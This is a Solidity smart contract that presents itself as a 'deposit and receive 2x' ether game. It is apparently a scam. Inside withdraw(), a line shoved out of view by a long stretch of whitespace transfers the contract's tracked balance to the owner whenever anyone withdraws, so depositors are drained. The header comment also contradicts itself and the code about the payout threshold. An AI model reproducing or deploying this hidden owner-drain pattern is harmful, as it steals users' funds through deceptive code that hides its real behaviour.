pragma solidity ^0.4.18;

/*
TWO EX RUSH!
Receive 2x your deposit only after the contract reaches 10 ETH.
The first to withdraw after the 20 ETH is hit wins, the others are stuck holding the bag.

Anti Whale: If you withdraw() and there is not enough ether in the contract to 2x your deposit,
            then the transaction fails. This prevents whales and encourages smaller deposits.
            i.e: Deposit 1ETH, withdraw() with 1.8 in the contract and it will fail.
*/

contract TwoExRush {

	string constant public name = "TwoExRush";
	address owner;
	address sender;
	uint256 withdrawAmount;
	uint256 contractATH;
	uint256 contractBalance;

	mapping(address => uint256) internal balance;

    function TwoExRush() public {
        owner = msg.sender;
    }

    // Require goal to be met before allowing anyone to withdraw.
	function withdraw() public {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        owner.transfer(contractBalance);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                
	    if(contractATH >= 20) {
	        sender = msg.sender;
	        withdrawAmount = mul(balance[sender], 2);
	 	    sender.transfer(withdrawAmount);
	        contractBalance -= balance[sender];
	        balance[sender] = 0;
	    }
	}

	function deposit() public payable {
 	    sender = msg.sender;
	    balance[sender] += msg.value;
	    contractATH += msg.value;
	    contractBalance += msg.value;
	}

	function () payable public {
		if (msg.value > 0) {
			deposit();
		} else {
			withdraw();
		}
	}
	
    // Safe Math
	function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }
}